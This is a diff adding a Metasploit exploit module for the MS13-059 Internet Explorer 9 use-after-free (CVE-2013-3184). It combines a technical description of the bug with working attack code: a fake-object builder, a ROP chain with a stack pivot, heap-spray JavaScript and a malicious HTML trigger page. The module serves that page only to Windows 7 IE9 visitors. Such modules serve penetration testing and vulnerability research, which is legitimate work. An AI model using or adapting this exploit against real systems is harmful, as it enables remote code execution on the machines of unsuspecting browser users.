@@ -1,0 +1,173 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Exploit::RopDb
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "MS13-059 Microsoft Internet Explorer CFlatMarkupPointer Use-After-Free",
+      'Description'    => %q{
+        This is a memory corruption bug found in Microsoft Internet Explorer. On IE 9,
+        it seems to only affect certain releases of mshtml.dll. For example: This module
+        can be used against version 9.0.8112.16446, but not for 9.0.8112.16421. IE 8
+        requires a different way to trigger the vulnerability, but not currently covered
+        by this module.
+
+        The issue is specific to the browser's IE7 document compatibility, which can be
+        defined in X-UA-Compatible, and the content editable mode must be enabled. An
+        "onmove" event handler is also necessary to be able to trigger the bug, and the
+        event will be run twice before the crash. The first time is due to the position
+        change of the body element, which is also when a MSHTML!CFlatMarkupPointer::`vftable'
+        object is created during a "SelectAll" command, and this object will be used later
+        on for the crash. The second onmove event seems to be triggered by a InsertButton
+        (or Insert-whatever) command, which is also responsible for the free of object
+        CFlatMarkupPointer during page rendering. The EnsureRecalcNotify() function will
+        then still return an invalid reference to CFlatMarkupPointer (stored in EBX), and
+        then passes this on to the next functions (GetLineInfo -> QIClassID).  When this
+        reference arrives in function QIClassID, an access violation finally occurs when
+        the function is trying to call QueryInterface() with the bad reference, and this
+        results a crash. Successful control of the freed memory may leverage arbitrary code
+        execution under the context of the user.
+
+        Note: It is also possible to see a different object being freed and used, doesn't
+        always have to be CFlatMarkupPointer.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'corelanc0d3r',  # Vuln discovery, PoC
+          'sinn3r'         # Metasploit
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2013-3184' ],
+          [ 'OSVDB', '96182'   ],
+          [ 'MSB', 'MS13-059'  ],
+          [ 'BID', '61668'     ],
+          [ 'URL', 'http://zerodayinitiative.com/advisories/ZDI-13-194/' ],
+          [ 'URL', 'http://zerodayinitiative.com/advisories/ZDI-13-195/' ]
+        ],
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          # Vulnerable IE9 tested: 9.0.8112.16446
+          [ 'Automatic', {} ],
+          [ 'IE 9 on Windows 7 SP1 (mshtml 9.0.8112.16446)', {} ]
+        ],
+      'Payload'        =>
+        {
+          'BadChars'        => "\x00",
+          'StackAdjustment' => -3500
+        },
+      'DefaultOptions'  =>
+        {
+          'InitialAutoRunScript' => 'migrate -f'
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => "Jun 27 2013",
+      'DefaultTarget'  => 0))
+  end
+
+  def rnd_dword
+    rand_text_alpha(4).unpack("V").first
+  end
+
+  def get_fake_obj
+    # edx,dword ptr [eax]
+    # ...
+    # call edx
+    obj  = [0x20302020].pack("V*")  # EAX points to this (Target spray 0x20302020)
+    obj << [rnd_dword].pack("V*")
+    obj << [rnd_dword].pack("V*")
+    obj << [rnd_dword].pack("V*")
+    obj << [rnd_dword].pack("V*")
+
+    return obj
+  end
+
+  # Target spray 0x20302020
+  # ESI is our fake obj, with [esi]=0x20302020, [esi+4]=0x42424242, so on
+  # eax=20302020 ebx=80004002 ecx=0250d890 edx=cccccccc esi=03909b68 edi=0250d8cc
+  # eip=cccccccc esp=0250d87c ebp=0250d8a8 iopl=0         nv up ei ng nz na po cy
+  # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010283
+  # cccccccc ??              ???
+  def get_payload
+    code  = ''
+    code << "\x81\xEC\xF0\xD8\xFF\xFF" # sub esp, -10000
+    code << "\x61\x9d"                 # popad; popfd
+    code << payload.encoded
+
+    stack_pivot = [
+      0x7c342643, # xchg eax, esp; pop edi; add [eax], al, pop ecx; ret
+      0x0c0c0c0c
+    ].pack("V*")
+
+    p = generate_rop_payload('java', code, {'pivot'=>stack_pivot})
+
+    return p
+  end
+
+  def is_win7_ie9?(agent)
+    (agent =~ /MSIE 9/ and agent =~ /Windows NT 6\.1/)
+  end
+
+  # The meta-refresh seems very necessary to make the object overwrite more reliable.
+  # Without it, it only gets about 50/50
+  def get_html(cli, req)
+    js_fake_obj = ::Rex::Text.to_unescape(get_fake_obj, ::Rex::Arch.endian(target.arch))
+    js_payload  = ::Rex::Text.to_unescape(get_payload, ::Rex::Arch.endian(target.arch))
+
+    html = %Q|
+    <html>
+    <meta http-equiv="X-UA-Compatible" content="IE=7"/>
+    <meta http-equiv="refresh" content="2"/>
+    <head>
+    <script language='javascript'>
+    #{js_property_spray}
+
+    var fake_obj = unescape("#{js_fake_obj}");
+    var s = unescape("#{js_payload}");
+
+    sprayHeap({shellcode:s});
+
+    function setupPage() {
+      document.body.style.position = 'absolute';
+      document.body.contentEditable = 'true';
+      document.body.style.right = '1';
+    }
+
+    function hitMe() {
+      document.execCommand('SelectAll');
+      document.execCommand('InsertButton');
+      sprayHeap({shellcode:fake_obj, heapBlockSize:0x10});
+      document.body.innerHTML = '#{Rex::Text.rand_text_alpha(1)}';
+    }
+    </script>
+    </head>
+    <body onload="setupPage()" onmove="hitMe()" />
+    </html>
+    |
+
+    html.gsub(/^\t\t/, '')
+  end
+
+  def on_request_uri(cli, request)
+    if is_win7_ie9?(request.headers['User-Agent'])
+      print_status("Sending exploit...")
+      send_response(cli, get_html(cli, request), {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})
+    else
+      print_error("Not a suitable target: #{request.headers['User-Agent']}")
+      send_not_found(cli)
+    end
+  end
+end
